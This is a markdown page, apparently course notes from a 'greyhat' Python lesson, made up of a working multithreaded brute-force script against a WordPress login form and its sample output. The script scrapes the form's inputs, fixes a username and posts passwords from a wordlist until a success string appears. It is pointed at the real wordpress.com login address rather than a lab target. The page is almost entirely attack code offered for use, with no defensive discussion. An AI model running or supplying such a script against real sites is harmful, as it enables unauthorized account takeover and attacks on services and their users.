# Bruter realization
```python
from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'
TARGET = "https://wordpress.com/log-in"
WORDLIST = '/Users/adanilishin/Lessons/Python_2_greyhat/Web/Sources/hackme.txt'


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split():
        words.put(word)
    return words


def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'): # trying to find all elements input
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params


class Bruter:
    def __init__(self, username, url, threads: int = 1):
        self.username = username
        self.url = url
        self.found = False
        self.threads = threads
        print(f'\nBrute Force Attack beginning on {url}.\n')
        print(f'Finished the setup where username = {username}')

    def run_bruteforce(self, passwords):
        for _ in range(self.threads):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        session = requests.Session()
        resp0 = session.get(self.url)
        params = get_params(resp0.content)
        params['log'] = self.username
        while not passwords.empty() and not self.found:
            time.sleep(5)
            passwd = passwords.get()
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd

            resp1 = session.post(self.url, data=params)
            if SUCCESS in resp1.content.decode():
                self.found = True
                print(f'\nBruteforcing successful.')
                print(f'Username: {self.username}')
                print(f'Password: {passwd}')
                print('Done: now cleaning up other threads...')


if __name__ == "__main__":
    words = get_words()
    b = Bruter('adanilishin', TARGET, threads=10)
    b.run_bruteforce(words)
```
### Output
```python
Brute Force Attack beginning on https://wordpress.com/log-in.

Finished the setup where username = adanilishin
Trying username/password adanilishin/one       
Trying username/password adanilishin/two       
Trying username/password adanilishin/three     
Trying username/password adanilishin/four      
Trying username/password adanilishin/five      
Trying username/password adanilishin/six       
Trying username/password adanilishin/seven     
Trying username/password adanilishin/eight     
Trying username/password adanilishin/nine      
Trying username/password adanilishin/ten
```